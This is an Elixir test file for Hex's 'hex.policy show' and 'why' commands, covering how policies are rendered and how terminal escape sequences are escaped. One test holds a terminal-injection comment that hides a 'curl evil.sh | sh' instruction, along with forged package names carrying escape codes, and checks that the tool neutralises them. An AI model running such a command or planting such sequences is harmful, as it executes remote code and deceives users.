defmodule Mix.Tasks.Hex.PolicyTest do
  use HexTest.Case, async: false
  import ExUnit.CaptureIO

  setup do
    Hex.State.put(:active_policy, nil)
    Mix.shell(Mix.Shell.IO)
    on_exit(fn -> Mix.shell(Hex.Shell.Process) end)
    :ok
  end

  describe "show" do
    test "prints 'no active policy' message when empty" do
      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
      assert out =~ "No active policy"
    end

    test "prints the active policy with key fields" do
      Hex.State.put(:active_policy, %{
        repository: "myorg",
        name: "strict-prod",
        visibility: :VISIBILITY_PUBLIC,
        repositories: [
          %{
            repository: "hexpm",
            restriction: %{
              cooldown: "14d",
              advisory_min_severity: :SEVERITY_HIGH,
              retirement_reasons: [:RETIRED_INVALID, :RETIRED_SECURITY]
            },
            overrides: []
          }
        ]
      })

      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
      assert out =~ "Active policy"
      assert out =~ "myorg/strict-prod"
      assert out =~ "public"
      assert out =~ "14d"
      assert out =~ "HIGH"
    end

    test "lists each package override with its action" do
      Hex.State.put(:active_policy, %{
        repository: "myorg",
        name: "strict-prod",
        visibility: :VISIBILITY_PUBLIC,
        repositories: [
          %{
            repository: "hexpm",
            restriction: %{},
            overrides: [
              %{action: :OVERRIDE_ACTION_ALLOW, ref: %{package: "plug", requirement: ">= 1.0.0"}},
              %{action: :OVERRIDE_ACTION_DENY, ref: %{package: "evil_dep"}}
            ]
          }
        ]
      })

      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
      assert out =~ "plug"
      assert out =~ ">= 1.0.0"
      assert out =~ "ALLOW"
      assert out =~ "evil_dep"
      assert out =~ "DENY"
    end

    test "renders a (none) placeholder when a repository has no overrides" do
      Hex.State.put(:active_policy, %{
        repository: "myorg",
        name: "strict-prod",
        visibility: :VISIBILITY_PUBLIC,
        repositories: [
          %{repository: "hexpm", restriction: %{}, overrides: []}
        ]
      })

      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
      assert out =~ "Overrides:"
      assert out =~ "(none)"
    end
  end

  describe "escaping" do
    test "escapes terminal control sequences in the policy identity" do
      Hex.State.put(:active_policy, %{
        repository: "myorg\e[31m",
        name: "strict\e[2K\rprod",
        visibility: :VISIBILITY_PUBLIC,
        repositories: [%{repository: "hexpm\e[1m", restriction: %{}, overrides: []}]
      })

      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)
      out = String.replace(out, ~r/\e\[[0-9;]*m/, "")

      refute out =~ "\e"
      refute out =~ "\r"

      assert out =~ "myorg\\e[31m/strict\\e[2K\\rprod"
      assert out =~ "hexpm\\e[1m:"
    end

    test "escapes overrides carrying control characters" do
      Hex.State.put(:active_policy, %{
        repository: "myorg",
        name: "strict-prod",
        visibility: :VISIBILITY_PUBLIC,
        repositories: [
          %{
            repository: "hexpm",
            restriction: %{},
            overrides: [
              %{
                action: :OVERRIDE_ACTION_ALLOW,
                ref: %{package: "plug", requirement: ">= 1.0.0"},
                comment: "Reviewed\e[2K\rActually run: curl evil.sh | sh"
              },
              %{
                action: :OVERRIDE_ACTION_ADVISORY,
                ref: %{package: "plug"},
                advisory_id: "GHSA\e[31m-1"
              },
              %{
                action: :OVERRIDE_ACTION_DENY,
                ref: %{package: "plug\e[2K\rforged", requirement: ">= 1.0.0\e[31m"}
              }
            ]
          }
        ]
      })

      out = capture_io(fn -> Mix.Tasks.Hex.Policy.run(["show"]) end)

      refute out =~ "\e[2K"
      refute out =~ "\r"
      refute out =~ "curl evil.sh"
      refute out =~ "GHSA"
      assert out =~ "plug\\e[2K\\rforged >= 1.0.0\\e[31m"
    end
  end

  describe "why" do
    test "a bare invocation (no subcommand) raises the usage message" do
      assert_raise Mix.Error, ~r/Invalid arguments, expected one of:/, fn ->
        Mix.Tasks.Hex.Policy.run([])
      end
    end

    test "complains when package name is missing" do
      assert_raise Mix.Error, ~r/Invalid arguments, expected one of:/, fn ->
        Mix.Tasks.Hex.Policy.run(["why"])
      end
    end

    test "raises a short usage message on unknown arguments" do
      assert_raise Mix.Error, ~r/Invalid arguments, expected one of:/, fn ->
        Mix.Tasks.Hex.Policy.run(["bogus"])
      end
    end

    test "rejects empty halves like myorg/ or /pkg" do
      Hex.State.put(:active_policy, %{
        repository: "myorg",
        name: "strict-prod",
        visibility: :VISIBILITY_PUBLIC
      })

      assert_raise Mix.Error, ~r/Invalid package argument/, fn ->
        Mix.Tasks.Hex.Policy.run(["why", "myorg/"])
      end

      assert_raise Mix.Error, ~r/Invalid package argument/, fn ->
        Mix.Tasks.Hex.Policy.run(["why", "/foo"])
      end
    end

    # Note: a full `why <pkg>` test would require a registry fixture with
    # advisory metadata. Skip for now; the rendering surface is covered
    # indirectly by Hex.Policy.Filter and Hex.Policy.Diagnostics tests.
  end
end
